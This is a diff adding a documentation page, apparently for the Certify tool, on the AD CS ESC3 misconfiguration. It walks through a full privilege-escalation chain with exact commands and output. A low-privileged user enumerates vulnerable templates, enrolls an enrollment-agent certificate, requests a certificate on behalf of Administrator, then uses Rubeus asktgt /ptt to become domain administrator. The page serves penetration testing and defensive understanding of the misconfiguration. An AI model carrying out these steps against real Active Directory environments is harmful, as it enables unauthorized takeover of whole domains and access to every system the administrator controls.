@@ -1,0 +1,312 @@
+---
+title: 'ESC3 - Misconfigured Certificate Request Agent'
+description: 'Exploit certificate templates with Certificate Request Agent EKU to enroll certificates on behalf of other users including domain administrators'
+icon: 'user-check'
+sidebarTitle: 'ESC3'
+---
+
+ESC3 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from a dangerous Extended Key Usage (EKU). Specifically, if a certificate template has been configured with the `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`) EKU, the certificate can be used to sign certificate requests "on-behalf-of" other users.
+
+<Info>
+The abuse scenario is a two-step process:
+1. Request and obtain a `Certificate Request Agent` (`Enrollment Agent`) certificate.
+2. Use the `Enrollment Agent` certificate to request certificates on behalf of other users.
+</Info>
+
+## The 'Enrollment Agent' Certificate
+
+The following criteria comprise an ESC3 vulnerability:
+
+<Accordion title="ESC3 Vulnerability Criteria">
+- The enterprise CA grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request any certificates from the CA.
+- The certificate template grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request certificates based on the specific template.
+- The "manager approval" feature is disabled for the certificate template.
+  - Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+- The "authorized signature" feature is disabled for the certificate template.
+  - Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+- The certificate template defines the `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`) Extended Key Usage (EKU).
+</Accordion>
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Enabled certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomEnrollmentAgent
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Certificate Request Agent
+    Certificate Application Policies      : Certificate Request Agent
+    Vulnerabilities
++     ESC3                                : The template has the 'Certificate Request Agent' EKU.
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+```
+</CodeGroup>
+
+Once we have identified a vulnerable ESC3 certificate template that our attacker-controlled user has enrollment rights for, we can request a certificate based on the template. This can be done using the `request` command from Certify.
+
+<CodeGroup>
+```bash Command
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomEnrollmentAgent
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CustomEnrollmentAgent
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.7984153
+```
+</CodeGroup>
+
+<Info>
+When the certificate has been issued, it is printed to the console in a base64-encoded format. This will be used in the next step.
+</Info>
+
+## The 'On-Behalf-Of' Certificate
+
+The following criteria comprise an "on-behalf-of" enrollable template:
+
+<Accordion title="On-Behalf-Of Template Criteria">
+- The enterprise CA does not implement enrollment agent restrictions.
+  - Otherwise, the attacker-controlled user most likely cannot act as an enrollment agent.
+- The enterprise CA grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request any certificates from the CA.
+- The certificate template grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request certificates based on the specific template.
+- The "manager approval" feature is disabled for the certificate template.
+  - Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+- The certificate template adheres to one of the following conditions depending on its schema version.
+  - It has schema version 1 (which has no concept of issuance requirements / authorized signatures).
+  - It has schema version 2 (or above) and a `Required Application Policy` matching the EKU of the enrollment agent.
+- The certificate template defines an Extended Key Usage (EKU) that enables client authentication.
+  - `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
+  - `PKINIT Client Authentication` (`1.3.6.1.5.2.3.4`)
+  - `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`)
+  - `Any Purpose` (`2.5.29.37.0`)
+  - `Subordinate CA` (No EKUs)
+</Accordion>
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-request-agent` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<Warning>
+According to [this blogpost](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d), if the enrollment agent certificate has **both** the `Certificate Request Agent` and the `Any Purpose` EKUs, it can only act as an enrollment agent (i.e. enroll "on-behalf-of" other users) for certificate templates that have schema version 1.
+</Warning>
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-request-agent --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Enabled certificate templates found using the current filter parameters:
+
+    Template Name                         : User
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
++   Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : <null>
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+    Template Name                         : CitrixUser
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
++   Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Manager Approval Required             : False
++   Authorized Signatures Required        : 1
++   Required Application Policies         : Certificate Request Agent
+    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+Certify completed in 00:00:00.5921058
+```
+</CodeGroup>
+
+Once we have identified a suitable certificate template that our attacker-controlled user has enrollment rights for, we can use the enrollment agent certificate to sign our certificate request and enroll "on-behalf-of" another user (e.g. `Administrator`). This can be done using the `request-agent` command from Certify.
+
+<CodeGroup>
+```bash Command
+Certify.exe request-agent --ca ca01.corp.local\CORP-CA01-CA --template User --target Administrator --agent-pfx MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate (on behalf of another user)
+
+[*] Current user context    : CORP\lowpriv
+
+[*] Template                : User
+[*] On Behalf Of            : Administrator
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 2
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.6793432
+```
+</CodeGroup>
+
+When the certificate has been issued, it is printed to the console in a base64-encoded format. The format is supported by [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) and can be used to authenticate as the target user with the [[`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt)](/GhostPack/Rubeus-mdx/commands/ticket-requests/asktgt#authentication-methods) command by setting the `/certificate:` parameter to the output certificate.
+
+<Warning>
+When requesting a TGT with a certificate, ensure to add the `/enctype:aes256` to match the highest standard encryption.
+</Warning>
+
+<CodeGroup>
+```bash Command
+Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```diff Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=corp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 18.56.43
+  EndTime                  :  01/07/2025 04.56.43
+  RenewTill                :  07/07/2025 18.56.43
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  mszQzkAMushj5bpH/N0lYA==
+  ASREP (key)              :  17CC8F0AA0F4AC67F4CD7B7AF6DF989F
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, the ticket has been injected into the Kerberos ticket list, and we should be able to authenticate as the target user and access systems that the target user has access to.
+
+<CodeGroup>
+```powershell Command
+Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}
+```
+
+```bash Output
+CORP\Administrator
+```
+</CodeGroup>
